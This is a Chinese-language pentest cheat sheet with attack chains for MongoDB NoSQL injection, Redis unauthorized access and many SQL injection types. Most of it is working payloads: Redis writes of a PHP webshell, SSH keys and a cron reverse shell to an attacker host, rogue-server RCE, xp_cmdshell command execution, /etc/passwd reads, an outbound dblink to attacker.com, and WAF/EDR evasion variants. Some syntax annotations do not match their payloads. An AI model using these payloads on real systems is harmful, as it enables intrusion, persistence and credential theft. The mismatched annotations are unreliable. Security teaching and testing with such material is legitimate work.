- `$ne` — 不等于操作符 _variable_
- `$gt` — 大于操作符 _variable_

**2. 绕过认证**
> 绕过登录认证
```
{"username": "admin", "password": {"$ne": "wrongpass"}}
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```
**语法解析：**
- `$ne` — 不等于，返回所有密码不为wrongpass的用户 _variable_

**3. 逻辑运算注入**
> 使用$or逻辑运算
```
{"username": "admin", "password": {"$or": [{"password": "realpass"}, {"1": "1"}]}}
```
**语法解析：**
- `$or` — 或运算符 _variable_

**4. 正则注入**
> 正则表达式注入
```
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
```
**语法解析：**
- `$regex` — 正则匹配操作符 _variable_
- `^admin` — 以admin开头 _value_

**5. $where注入**
> $where子句JavaScript注入
```
{"$where": "this.username == 'admin' && this.password.match(/.*/)"}
```
**语法解析：**
- `$where` — 执行JavaScript代码 _variable_
- `this.username` — 当前文档的字段 _value_

**6. 盲注提取数据**
> 使用正则逐字符提取
```
{"username": {"$regex": "^a"}}
{"username": {"$regex": "^ad"}}
{"username": {"$regex": "^adm"}}
逐字符枚举用户名
```
**语法解析：**
- `{"username":` — 命令/载荷起始 _command_
- ` {"$regex": "^a"}}
{"username": {"$regex": "^ad"}}
{"username": {"$regex": "^adm"}}
逐字符枚举用户名` — 参数与载荷内容 _value_

**WAF/EDR 绕过变体：**

**Unicode绕过**
> Unicode编码绕过
```
{"username": {"\u0024ne": ""}}
使用Unicode编码$符号
```
**语法解析：**
- `\uXXXX` — Unicode编码 _encoding_


**概述：** MongoDB是最流行的NoSQL数据库之一，其查询使用JSON格式而非SQL语法。NoSQL注入通过操纵查询运算符($gt/$ne/$regex等)来绕过认证或提取数据，攻击面与传统SQL注入截然不同。

**漏洞原理：** MongoDB注入利用JSON查询运算符绕过认证：$ne(不等于)绕过密码验证、$gt(大于)匹配任意值、$regex进行正则盲注提取数据、$where注入JavaScript代码执行服务端脚本，以及聚合管道注入进行复杂数据操作。

**利用方法：** 完整利用流程：
1. 探测注入点
2. 使用操作符绕过认证
3. 使用正则逐字符提取数据
4. 尝试$where执行JavaScript

**防御措施：** 防御措施：
1. 使用参数化查询
2. 输入验证
3. 禁用$where操作符
4. 最小权限原则

---

### Redis未授权访问  `sqli-redis`
_Redis未授权访问和命令注入_
子类：**Redis** · tags: `redis` `nosql` `injection`

**前置条件：**
- Redis服务可访问
- 未授权或弱密码

**攻击链：**

**1. 探测Redis**
> 探测Redis服务
```
redis-cli -h target.com ping
redis-cli -h target.com info
```
**语法解析：**
- `redis-cli` — Redis命令行客户端 _value_
- `ping` — 测试连接 _command_
- `info` — 获取服务器信息 _value_

**2. 未授权访问**
> 未授权访问Redis
```
redis-cli -h target.com
> INFO
> KEYS *
> GET sensitive_key
```
**语法解析：**
- `INFO` — 获取Redis信息 _value_
- `KEYS *` — 列出所有键 _value_

**3. 写入Webshell**
> 写入Webshell
_platform: linux_
```
redis-cli -h target.com
> CONFIG SET dir /var/www/html/
> CONFIG SET dbfilename shell.php
> SET shell "<?php system($_GET['cmd']); ?>"
> SAVE
```
**语法解析：**
- `CONFIG SET dir` — 设置RDB文件保存目录 _value_
- `CONFIG SET dbfilename` — 设置RDB文件名 _value_
- `SAVE` — 保存数据库到文件 _value_

**4. 写入SSH公钥**
> 写入SSH公钥
_platform: linux_
```
redis-cli -h target.com
> CONFIG SET dir /root/.ssh/
> CONFIG SET dbfilename authorized_keys
> SET sshkey "ssh-rsa AAAA..."
> SAVE
```
**语法解析：**
- `redis-cli -h target.com` — 第1步操作 _command_
- `> CONFIG SET dir /root/.ssh/` — 第2步操作 _value_
- `> CONFIG SET dbfilename authorized_keys` — 第3步操作 _value_
- `> SET sshkey "ssh-rsa AAAA..."` — 第4步操作 _value_
- `> SAVE` — 第5步操作 _value_

**5. 写入Cron任务**
> 写入Cron任务
_platform: linux_
```
redis-cli -h target.com
> CONFIG SET dir /var/spool/cron/
> CONFIG SET dbfilename root
> SET cron "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"
> SAVE
```
**语法解析：**
- `/var/spool/cron/` — Cron任务目录 _path_
- `*/1 * * * *` — 每分钟执行 _value_

**6. 主从复制RCE**
> 主从复制RCE
_platform: linux_
```
使用redis-rogue-server工具:
python redis-rogue-server.py --rhost target.com --lhost attacker.com
通过主从复制加载恶意模块执行命令
```
**语法解析：**
- `使用redis-rogue-server工具:` — 第1步操作 _command_
- `python redis-rogue-server.py --rhost target.com --lhost attacker.com` — 第2步操作 _value_
- `通过主从复制加载恶意模块执行命令` — 第3步操作 _value_

**WAF/EDR 绕过变体：**

**Redis命令混淆绕过**
> 使用引号分割命令字符串、拼接变量等方式混淆Redis命令绕过WAF检测
```
redis-cli -h target.com
> "C""O""N""F""I""G" SET dir /var/www/html/
> $(printf 'CONF')$(printf 'IG') SET dbfilename shell.php
> SET shell "<?php system(\$_GET['cmd']); ?>"
> SAVE
```
**语法解析：**
- `system()` — 系统命令执行 _function_
- `$()` — 命令替换 _operator_

**Redis Lua脚本执行绕过**
> 通过EVAL执行Lua脚本间接调用Redis命令，绕过对CONFIG/SET等直接命令的检测
```
redis-cli -h target.com
> EVAL "redis.call('set','shell','<?php system(\$_GET[c]); ?>')" 0
> EVAL "redis.call('config','set','dir','/var/www/html/')" 0
> EVAL "redis.call('config','set','dbfilename','test.php')" 0
> EVAL "redis.call('save')" 0
```
**语法解析：**
- `system()` — 系统命令执行 _function_


**概述：** Redis是高性能的键值对存储系统，常被用作缓存和消息队列。Redis注入通过CRLF注入或未授权访问执行任意Redis命令，可导致数据泄露、写入webshell甚至通过主从复制RCE。

**漏洞原理：** Redis漏洞主要包括：未授权访问(默认无密码)导致任意命令执行，CRLF注入将恶意Redis命令注入合法请求中，CONFIG SET修改持久化路径写入crontab或SSH公钥，以及通过主从复制加载恶意模块实现RCE。

**利用方法：** 完整利用流程：
1. 探测Redis服务
2. 尝试未授权访问
3. 写入Webshell/SSH公钥/Cron任务
4. 或使用主从复制RCE

**防御措施：** 防御措施：
1) 设置强密码
2) 绑定内网IP
3) 禁用CONFIG命令
4) 使用普通用户运行Redis

---

### 布尔盲注  `sqli-blind`
_基于布尔条件的SQL盲注技术_
子类：**盲注** · tags: `sqli` `blind` `boolean`

**前置条件：**
- 存在SQL注入
- 页面有真/假两种不同响应

**攻击链：**

**1. 确认盲注**
> 确认布尔盲注
```
' AND 1=1-- (返回正常)
' AND 1=2-- (返回异常)
确认存在布尔盲注
```
**语法解析：**
- `AND 1=1` — 永真条件 _value_
- `AND 1=2` — 永假条件 _value_

**2. 获取数据库名长度**
> 枚举数据库名长度
```
' AND LENGTH(database())=1--
' AND LENGTH(database())=2--
...
' AND LENGTH(database())=N--
直到返回正常
```
**语法解析：**
- `LENGTH()` — 返回字符串长度 _function_

**3. 逐字符枚举数据库名**
> 逐字符提取数据库名
```
' AND ASCII(SUBSTRING(database(),1,1))>97--
' AND ASCII(SUBSTRING(database(),1,1))>100--
...
使用二分法快速定位字符
```
**语法解析：**
- `SUBSTRING(str,pos,len)` — 截取子字符串 _value_
- `ASCII()` — 返回ASCII码值 _function_

**4. 使用工具自动化**
> 使用sqlmap自动化
```
sqlmap -u "http://target.com?id=1" --technique=B --dbs
使用sqlmap进行布尔盲注
```
**语法解析：**
- `--technique=B` — 指定布尔盲注技术 _parameter_
- `--dbs` — 枚举数据库 _parameter_

**WAF/EDR 绕过变体：**

**布尔盲注条件表达式替代**
> 使用CASE WHEN替代IF()、MID()替代SUBSTRING()、LEFT/RIGHT组合截取、BETWEEN替代大于小于比较
```
' AND (CASE WHEN (MID(database(),1,1)='a') THEN 1 ELSE 0 END)=1--
' AND LEFT(database(),1)>'a'--
' AND RIGHT(LEFT(database(),2),1)='d'--
' AND ORD(MID(database(),1,1))BETWEEN 97 AND 122--
```
**语法解析：**
- `CASE WHEN` — 条件表达式 _keyword_
- `SUBSTRING` — 字符串截取 _function_
- `--` — SQL注释 _operator_

**布尔盲注数学运算与位运算绕过**
> 使用HEX/CONV进行编码比较、位与运算(&)判断字符范围、POW()数学函数混淆、DIV替代AND
```
' AND (SELECT CONV(HEX(SUBSTR(database(),1,1)),16,10))>96--
' AND (SELECT ORD(MID(database(),1,1))&0x40)=0x40--
' AND (SELECT POW(ORD(MID(database(),1,1)),0))+0=1--
' DIV 1 AND (SELECT LENGTH(database()))>0--
```
**语法解析：**
- `SELECT` — 查询数据 _keyword_
- `SUBSTRING` — 字符串截取 _function_
- `HEX()` — 十六进制编码 _encoding_
- `--` — SQL注释 _operator_


**概述：** SQL盲注是指注入成功但页面不直接回显数据的场景，需要通过条件判断(布尔盲注)或时间延迟(时间盲注)来逐字符推断数据，是实战中最常见的注入类型。

**漏洞原理：** SQL盲注漏洞存在于所有未正确参数化的查询中，攻击者通过构造布尔条件(AND 1=1 vs AND 1=2)观察页面差异，或使用SLEEP/BENCHMARK等延时函数判断条件真假，逐位提取数据库中的任意信息。

**利用方法：** 完整利用流程：
1. 确认布尔盲注存在
2. 枚举数据长度
3. 逐字符提取数据
4. 使用工具自动化

**防御措施：** 防御SQL盲注：使用参数化查询/预编译语句，实施WAF规则检测异常条件语句和延时函数，监控慢查询日志发现异常SLEEP请求，设置数据库查询超时限制，以及部署RASP实时检测SQL注入行为。

---

### 时间盲注  `sqli-time-based`
_基于时间延迟的SQL盲注技术_
子类：**盲注** · tags: `sqli` `blind` `time`

**前置条件：**
- 存在SQL注入
- 页面响应时间可控

**攻击链：**

**1. 确认时间盲注**
> 确认时间盲注
```
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
观察响应是否延迟5秒
```
**语法解析：**
- `SLEEP(5)` — MySQL延时5秒 _value_
- `IF(cond,true,false)` — 条件判断函数 _value_

**2. 获取数据库名长度**
> 枚举数据库名长度
```
' AND IF(LENGTH(database())=N,SLEEP(5),0)--
枚举数据库名长度
```
**语法解析：**
- `SLEEP()` — 延时函数 _function_
- `--` — SQL注释 _operator_

**3. 逐字符提取**
> 逐字符提取数据
```
' AND IF(ASCII(SUBSTRING(database(),1,1))>97,SLEEP(5),0)--
使用二分法提取字符
```
**语法解析：**
- `SLEEP()` — 延时函数 _function_
- `--` — SQL注释 _operator_

**4. 不同数据库延时函数**
> 各数据库延时函数
```
MySQL: SLEEP(5), BENCHMARK()
MSSQL: WAITFOR DELAY '0:0:5'
PostgreSQL: pg_sleep(5)
Oracle: DBMS_LOCK.SLEEP(5)
```
**语法解析：**
- `WAITFOR DELAY` — MSSQL延时 _value_
- `pg_sleep()` — PostgreSQL延时 _function_

**WAF/EDR 绕过变体：**

**时间延迟替代函数绕过**
> 使用BENCHMARK()替代SLEEP()、笛卡尔积重查询消耗时间、GET_LOCK()锁等待、CASE条件触发延时
```
' AND BENCHMARK(5000000,SHA1('test'))--
' AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)--
' AND GET_LOCK('sqli_test',5)--
' AND (CASE WHEN database() LIKE '%' THEN BENCHMARK(3000000,MD5('x')) ELSE 0 END)--
```
**语法解析：**
- `SELECT...FROM` — 查询数据 _keyword_
- `information_schema` — 元数据库 _value_
- `BENCHMARK` — 基准测试延迟 _function_
- `CASE WHEN` — 条件表达式 _keyword_
- `--` — SQL注释 _operator_

**跨数据库时间延迟绕过**
> 利用各数据库特有的时间延迟方法：PostgreSQL的pg_sleep条件触发、MSSQL的IF条件WAITFOR、Oracle的DBMS_PIPE.RECEIVE_MESSAGE替代DBMS_LOCK
```
PostgreSQL: ' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
MSSQL: '; IF (1=1) WAITFOR DELAY '0:0:5'--
Oracle: ' AND 1=CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END--
MySQL: ' AND (SELECT SLEEP(5) FROM DUAL WHERE 1=1)--
```
**语法解析：**
- `SELECT...FROM` — 查询数据 _keyword_
- `WHERE` — 条件筛选 _keyword_
- `SLEEP()` — 时间延迟 _function_
- `WAITFOR DELAY` — MSSQL延迟 _keyword_
- `CASE WHEN` — 条件表达式 _keyword_
- `--` — SQL注释 _operator_


**概述：** SQL时间盲注通过注入延时函数(如SLEEP/WAITFOR/pg_sleep)来判断条件真假，适用于页面无任何可观察差异的场景，是最隐蔽但效率最低的注入方式。

**漏洞原理：** SQL时间盲注利用数据库内置的延时功能：MySQL的SLEEP()和BENCHMARK()、MSSQL的WAITFOR DELAY、PostgreSQL的pg_sleep()、Oracle的DBMS_LOCK.SLEEP()。通过条件语句控制延时触发，逐字符推断目标数据。

**利用方法：** 完整利用流程：
1. 确认时间盲注存在
2. 枚举数据长度
3. 逐字符提取
4. 使用sqlmap自动化

**防御措施：** 防御SQL时间盲注：除参数化查询外，还应设置严格的数据库查询超时(如5秒)，监控异常慢查询模式，WAF检测SLEEP/WAITFOR/BENCHMARK等延时函数关键词，限制单IP的并发查询数量。

---

### 报错注入  `sqli-error-based`
_利用错误信息提取数据的SQL注入_
子类：**报错注入** · tags: `sqli` `error` `extractvalue`

**前置条件：**
- 存在SQL注入
- 错误信息会显示在页面上

**攻击链：**

**1. 确认报错注入**
> 测试报错注入
```
' AND extractvalue(1,concat(0x7e,version()))--
' AND updatexml(1,concat(0x7e,version()),1)--
```
**语法解析：**
- `extractvalue()` — MySQL XML提取函数 _function_
- `updatexml()` — MySQL XML更新函数 _function_
- `concat(0x7e,...)` — 拼接波浪号标记 _value_

**2. 获取数据库信息**
> 获取基础信息
```
' AND extractvalue(1,concat(0x7e,database()))--
' AND extractvalue(1,concat(0x7e,user()))--
' AND extractvalue(1,concat(0x7e,version()))--
```
**语法解析：**
- `CONCAT` — 字符串拼接 _function_
- `--` — SQL注释 _operator_
- `EXTRACTVALUE` — 报错注入函数 _function_

**3. 获取表名**
> 获取表名
```
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--
```
**语法解析：**
- `SELECT` — 查询数据 _keyword_
- `CONCAT` — 字符串拼接 _function_
- `information_schema` — 元数据库 _value_
- `--` — SQL注释 _operator_

**4. 获取数据**
> 提取数据
```
' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 0,1)))--
```
**语法解析：**
- `SELECT` — 查询数据 _keyword_
- `CONCAT` — 字符串拼接 _function_
- `--` — SQL注释 _operator_
- `EXTRACTVALUE` — 报错注入函数 _function_

**5. 其他报错函数**
> 其他报错注入方法
```
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND EXP(~(SELECT * FROM (SELECT version())a))--
```
**语法解析：**
- `FLOOR(RAND(0)*2)` — 产生重复键错误 _value_
- `EXP()` — 数学函数溢出报错 _function_

**WAF/EDR 绕过变体：**

**替代报错函数绕过**
> 使用GEOMETRYCOLLECTION空间函数、JSON_KEYS、ST_LatFromGeoHash等冷门函数替代extractvalue/updatexml触发报错
```
' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT * FROM (SELECT version())a)b))--
' AND (SELECT 1 FROM (SELECT NTILE(1) OVER(ORDER BY (SELECT version())))a)--
' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--
' AND ST_LatFromGeoHash(version())--
```
**语法解析：**
- `SELECT...FROM` — 查询数据 _keyword_
- `CONCAT` — 字符串拼接 _function_
- `ORDER BY` — 排序/列数探测 _keyword_
- `--` — SQL注释 _operator_

**编码与科学计数法绕过**
> 使用unhex(hex())双层编码、EXP()科学计数法溢出、URL双重编码（%26%26替代AND）绕过WAF检测
```
' AND extractvalue(1,concat(0x7e,(SELECT unhex(hex(database())))))--
' AND 1=1 AND EXP(~(SELECT * FROM (SELECT CONCAT(0x7e,database(),0x7e) x)a))--
' AND (SELECT 1 FROM (SELECT count(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.schemata GROUP BY x)a)--
' %26%26 updatexml(1,concat(0x7e,(select%20database())),1)--%20
```
**语法解析：**
- `SELECT...FROM` — 查询数据 _keyword_
- `information_schema` — 元数据库 _value_
- `CONCAT` — 字符串拼接 _function_
- `HEX()` — 十六进制编码 _encoding_
- `UNHEX()` — 十六进制解码 _encoding_
- `--` — SQL注释 _operator_
- `%xx` — URL编码 _encoding_


**概述：** SQL报错注入利用数据库错误信息直接回显数据，通过构造特定的函数调用(如updatexml/extractvalue/exp)使数据库在错误消息中输出查询结果，效率远高于盲注。

**漏洞原理：** SQL报错注入利用数据库在处理非法输入时将内部数据暴露在错误信息中：MySQL的updatexml()/extractvalue()/exp()溢出、MSSQL的convert()/cast()类型转换错误、PostgreSQL的cast()错误，以及Oracle的XMLType()等函数。

**利用方法：** 完整利用流程：
1. 确认报错注入存在
2. 使用extractvalue/updatexml提取数据
3. 枚举数据库结构
4. 提取敏感数据

**防御措施：** 防御SQL报错注入：生产环境必须关闭详细错误信息显示(display_errors=off)，使用自定义错误页面替代默认数据库错误，记录错误日志但不向用户展示，使用参数化查询从根本上防止注入。

---

### 二阶SQL注入  `sqli-second-order`
_存储后触发的SQL注入攻击_
子类：**二阶注入** · tags: `sqli` `second-order` `stored`

**前置条件：**
- 存在数据存储功能
- 存储数据被二次使用

**攻击链：**

**1. 探测二阶注入**
> 探测二阶注入点
```
注册用户名: admin'--
或: admin' OR '1'='1
登录后查看是否影响其他功能
```
**语法解析：**
- `OR '1'='1'` — 逻辑永真 _keyword_
- `--` — SQL注释 _operator_

**2. 用户名注入**
> 用户名触发注入
```
注册用户: admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 1),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
登录触发报错注入
```
**语法解析：**
- `FLOOR(RAND(0)*2)` — 报错注入关键 _value_
- `GROUP BY x` — 触发重复键错误 _value_

**3. 密码重置注入**
> 密码重置功能注入
```
输入邮箱: ' OR '1'='1
可能触发密码重置所有用户
```
**语法解析：**
- `OR '1'='1'` — 逻辑永真 _keyword_

**4. 订单/评论注入**
> 评论触发注入
```
提交评论: ' UNION SELECT username,password FROM users--
管理员查看评论时触发
```
**语法解析：**
- `UNION` — 合并查询结果 _keyword_
- `SELECT...FROM` — 查询数据 _keyword_
- `--` — SQL注释 _operator_

**WAF/EDR 绕过变体：**

**编码存储触发绕过**
> 在存储阶段使用注释截断(/**/)或CHAR()编码构造payload，WAF在输入时检测不到恶意SQL，但数据库二次使用时自动触发
```
注册用户名: admin'/*
随后修改密码时SQL变为: UPDATE users SET password='new' WHERE username='admin'/*'

注册用户名: CONCAT(CHAR(39),CHAR(32),CHAR(79),CHAR(82),CHAR(32),CHAR(39),CHAR(49),CHAR(39),CHAR(61),CHAR(39),CHAR(49))
存储后二次使用时自动解码触发注入
```
**语法解析：**
- `WHERE` — 条件筛选 _keyword_
- `UPDATE...SET` — 更新数据 _keyword_
- `CONCAT` — 字符串拼接 _function_

**Unicode标准化绕过**
> 利用Unicode全角字符(U+FF07)标准化、转义序列还原、不同功能模块的过滤差异来绕过WAF检测
```
注册用户名: admin＇ OR ＇1＇=＇1
(使用全角引号U+FF07，数据库标准化为半角后触发)

注册邮箱: test@test.com' UNION SELECT password FROM users WHERE '1'='1
(邮箱验证通过WAF但存储后在其他查询中拼接触发)

评论内容: \x27 OR 1=1--
(转义序列在存储层被还原为单引号)
```
**语法解析：**
- `UNION` — 合并查询结果 _keyword_
- `SELECT...FROM` — 查询数据 _keyword_
- `WHERE` — 条件筛选 _keyword_
- `OR '1'='1'` — 逻辑永真 _keyword_
- `--` — SQL注释 _operator_


**概述：** SQL二次注入是指恶意输入在首次存储时被正确转义，但在后续查询中未经转义直接使用，导致注入触发。这种漏洞因为输入和触发分离，极难被自动化工具发现。

**漏洞原理：** SQL二次注入的根因在于：开发者在数据写入时使用了参数化查询或转义处理，但在读取并再次使用这些数据时却直接拼接进SQL语句中。典型场景包括用户注册时存储恶意用户名，在修改密码时触发注入。

**利用方法：** 二次注入利用步骤：1)注册包含SQL payload的用户名(如admin'-- ) 2)正常登录该账号 3)触发使用该用户名的功能(如修改密码) 4)后台SQL拼接了未转义的用户名导致注入触发 5)通过该注入窃取或修改其他用户数据。

**防御措施：** 防御二次注入：对所有数据在每次使用时都执行参数化查询，不仅在写入时，在读取后再次使用时也必须参数化。建立安全编码规范：任何来自数据库的数据都应视为不可信输入。

---

### 联合查询注入  `sqli-union`
_使用UNION SELECT提取数据_
子类：**联合查询** · tags: `sqli` `union` `select`

**前置条件：**
- 存在注入点
- 可显示查询结果

**攻击链：**

**1. 确定列数**
> 确定列数
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
直到报错
或:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```
**语法解析：**
- `ORDER BY` — 按列排序确定列数 _value_
- `NULL,NULL` — 逐个增加NULL确定列数 _value_

**2. 确定显示列**
> 确定显示位置
```
' UNION SELECT 1,2,3--
' UNION SELECT 'a','b','c'--
找出哪些列会显示在页面上
```
**语法解析：**
- `UNION` — 合并查询结果集 _keyword_
- `SELECT` — 查询数据 _keyword_
- `--` — SQL注释 _operator_

**3. 提取数据**
> 提取数据
```
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,2,3 FROM information_schema.tables--
```
**语法解析：**
- `UNION` — 合并查询结果集 _keyword_
- `SELECT` — 查询数据 _keyword_
- `information_schema` — 元数据库 _value_
- `--` — SQL注释 _operator_

**4. 绕过过滤**
> 绕过关键字过滤
```
' /*!UNION*/ /*!SELECT*/ 1,2,3--
' UnIoN SeLeCt 1,2,3--
' UNION/**/SELECT/**/1,2,3--
```
**语法解析：**
- `UNION` — 合并查询结果集 _keyword_
- `SELECT` — 查询数据 _keyword_
- `--` — SQL注释 _operator_

**WAF/EDR 绕过变体：**

**UNION注入关键字绕过**
> 使用MySQL版本注释/*!50000*/、URL编码UNION/SELECT关键字、%23换行绕过、空白字符混淆（%09 TAB, %0d CR, %0b VT）
```
' /*!50000UNION*/ /*!50000SELECT*/ 1,database(),3--
' %55%4e%49%4f%4e %53%45%4c%45%43%54 1,2,3--
' uNiOn%23%0aSeLeCt 1,2,3--
' UNION%0a%09%0d%0bSELECT%0a1,2,3--
```
**语法解析：**
- `UNION` — 合并查询结果 _keyword_
- `SELECT` — 查询数据 _keyword_
- `--` — SQL注释 _operator_
- `/*...*/` — 内联注释 _operator_
- `%xx` — URL编码 _encoding_

**UNION注入NULL字节与分块绕过**
> 使用NULL字节(%00)截断WAF检测、UNION ALL绕过去重检测、HTTP分块传输编码将关键字分散到不同chunk、自定义SEPARATOR替代默认逗号
```
' UNION%00SELECT 1,2,3--
' /*!UNION*/%20/*!ALL*//*!SELECT*/ 1,2,3--
Transfer-Encoding: chunked

5
UNION
7
 SELECT
1
 
0

' UNION SELECT 1,group_concat(table_name SEPARATOR 0x3c62723e),3 FROM information_schema.tables WHERE table_schema=database()--
```
**语法解析：**
- `UNION` — 合并查询结果 _keyword_
- `SELECT...FROM` — 查询数据 _keyword_
- `WHERE` — 条件筛选 _keyword_
- `information_schema` — 元数据库 _value_
- `CONCAT` — 字符串拼接 _function_
- `GROUP_CONCAT` — 分组拼接 _function_
- `--` — SQL注释 _operator_
- `/*...*/` — 内联注释 _operator_
- `%xx` — URL编码 _encoding_
- `Transfer-Encoding` — 传输编码头 _header_
- `chunked` — 分块传输 _keyword_


**概述：** UNION联合查询注入通过UNION SELECT将攻击者的查询结果与原始查询合并输出，是数据提取效率最高的注入方式，可一次性获取整行整列的数据。

**漏洞原理：** UNION注入要求攻击者的SELECT子句与原始查询有相同的列数和兼容的数据类型。漏洞利用前需先确定列数(ORDER BY递增法或UNION SELECT NULL法)，再逐步替换NULL为目标字段提取数据库名、表名、列名及数据。

**利用方法：** UNION注入步骤：1)ORDER BY N确定列数 2)UNION SELECT NULL,...找到回显位 3)替换回显位为version()/database() 4)查询information_schema获取表名和列名 5)UNION SELECT提取目标数据(用户名、密码哈希等)。

**防御措施：** 防御UNION注入：使用参数化查询(最有效)，部署WAF检测UNION SELECT关键词组合，限制查询返回的列数和行数，对information_schema的访问权限进行限制，最小化数据库用户权限。

---

### 堆叠查询注入  `sqli-stacked`
_执行多条SQL语句的注入_
子类：**堆叠查询** · tags: `sqli` `stacked` `queries`

**前置条件：**
- 支持多语句执行
- MySQL/PostgreSQL/MSSQL

**攻击链：**

**1. 探测堆叠查询**
> 探测是否支持堆叠查询
```
'; SELECT SLEEP(5)--
'; SELECT 1--
'; WAITFOR DELAY '0:0:5'--
```
**语法解析：**
- `SELECT` — 查询数据 _keyword_
- `SLEEP()` — 延时函数 _function_
- `WAITFOR DELAY` — MSSQL延时 _function_
- `--` — SQL注释 _operator_

**2. MySQL堆叠查询**
> MySQL执行多语句
_platform: linux_
```
'; INSERT INTO users(username,password) VALUES('hacker','hacked');--
'; UPDATE users SET password='hacked' WHERE username='admin';--
'; SELECT SLEEP(5);--
> ⚠️ 仅验证堆叠注入存在性，严禁 DROP/TRUNCATE/DELETE
```
**语法解析：**
- `;` — 语句分隔符 _operator_
- `INSERT INTO` — 插入数据 _value_

**3. MSSQL堆叠查询**
> MSSQL执行命令
_platform: windows_
```
'; EXEC xp_cmdshell('whoami');--
'; EXEC sp_executesql N'SELECT * FROM users';--
```
**语法解析：**
- `SELECT` — 查询数据 _keyword_
- `--` — SQL注释 _operator_
- `EXEC` — 执行存储过程 _keyword_
- `xp_cmdshell` — 系统命令执行 _function_

**4. PostgreSQL堆叠查询**
> PostgreSQL读取文件
_platform: linux_
```
'; COPY users FROM '/etc/passwd';--
'; SELECT * FROM pg_read_file('/etc/passwd');--
```
**语法解析：**
- `SELECT` — 查询数据 _keyword_
- `--` — SQL注释 _operator_

**WAF/EDR 绕过变体：**

**堆叠查询终止符替代绕过**
> 使用URL编码分号(%3B)、换行符分隔、内联注释包裹SELECT、PREPARE预处理执行十六进制编码的查询语句
```
' %3B SELECT user()--
' ;%0a SELECT user()--
' ; /*!SELECT*/ user()--
'; SET @q=0x53454C45435420757365722829; PREPARE stmt FROM @q; EXECUTE stmt;--
```
**语法解析：**
- `SELECT...FROM` — 查询数据 _keyword_
- `--` — SQL注释 _operator_
- `/*...*/` — 内联注释 _operator_
- `%xx` — URL编码 _encoding_

**堆叠查询条件执行绕过**
> 使用字符串拼接分割命令关键字、CHAR()编码命令参数、CASE条件执行、PostgreSQL DO块执行复杂逻辑
```
'; IF(1=1) EXEC('wh'+'oam'+'i');--
'; DECLARE @s VARCHAR(100)=CHAR(119)+CHAR(104)+CHAR(111)+CHAR(97)+CHAR(109)+CHAR(105); EXEC xp_cmdshell @s;--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) END;--
'; DO $$ BEGIN PERFORM dblink_connect('host=attacker.com dbname=test'); END $$;--
```
**语法解析：**
- `SELECT` — 查询数据 _keyword_
- `SLEEP()` — 时间延迟 _function_
- `xp_cmdshell` — 系统命令执行 _function_
- `EXEC` — 执行存储过程 _keyword_
- `CASE WHEN` — 条件表达式 _keyword_
- `--` — SQL注释 _operator_


**概述：** SQL堆叠查询注入通过分号(;)分隔多条SQL语句，可在一次请求中执行INSERT/UPDATE/DELETE甚至创建存储过程，危害远超普通SELECT注入。

**漏洞原理：** SQL堆叠查询在MSSQL和PostgreSQL中默认支持，MySQL在PHP的mysqli_multi_query()下才支持。该漏洞可执行任意DML/DDL操作：插入管理员账户、修改密码、删除数据、创建后门存储过程甚至执行系统命令。

**利用方法：** 堆叠注入利用：1)确认目标支持堆叠查询(;SELECT SLEEP(2)) 2)执行INSERT添加管理员账号 3)执行UPDATE修改现有账户密码 4)MSSQL环境下启用并调用xp_cmdshell执行系统命令 5)PostgreSQL下通过COPY TO写文件。

**防御措施：** 防御堆叠查询注入：使用参数化查询，数据库连接配置禁用多语句执行，限制数据库账户权限(禁止CREATE/DROP/ALTER)，WAF检测分号分隔的多语句模式，定期审计数据库操作日志。

---

### SQL注入WAF绕过  `sqli-waf-bypass`
_绕过Web应用防火墙的技术_
子类：**WAF绕过** · tags: `sqli` `waf` `bypass`

**前置条件：**
- 目标存在SQL注入点
- 存在WAF防护

**攻击链：**

**分块传输编码**
> 利用分块传输绕过WAF检测
```
Transfer-Encoding: chunked

2
id
1
=
1
1

0
```
**语法解析：**
- `Transfer-Encoding` — 传输编码头 _header_
- `chunked` — 分块传输 _keyword_

**HTTP参数污染(HPP)**
> 利用HPP拆分恶意Payload
```
?id=1&id=UNION&id=SELECT&id=1,2,3--
```
**语法解析：**
- `UNION` — 合并查询结果集 _keyword_
- `SELECT` — 查询数据 _keyword_
- `--` — SQL注释 _operator_

**等价函数替换**
> 使用GREATEST替代>符号
```
' AND GREATEST(1,0)--
```
**语法解析：**
- `--` — SQL注释 _operator_

**无逗号注入**
> 不使用逗号进行联合查询
```
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
```
**语法解析：**
- `UNION` — 合并查询结果 _keyword_
- `SELECT...FROM` — 查询数据 _keyword_
- `--` — SQL注释 _operator_

**IBM/Oracle特有**
> 利用特定数据库特性绕过通用规则
```
' UNION SELECT CAST(1 AS VARCHAR(10)) FROM dual--
```
**语法解析：**
- `{{}}` — 模板表达式 _technique_
- `__class__` — 类属性 _keyword_

**垃圾数据填充**
> 超长数据溢出WAF缓冲区 (示意代码)
```
/* !50000AAAAAAAAAA...(1000+字节垃圾数据)...*/ UNION SELECT 1,2,3--
```
**语法解析：**
- `UNION` — 合并查询结果集 _keyword_
- `SELECT` — 查询数据 _keyword_
- `--` — SQL注释 _operator_

**Content-Type欺骗**
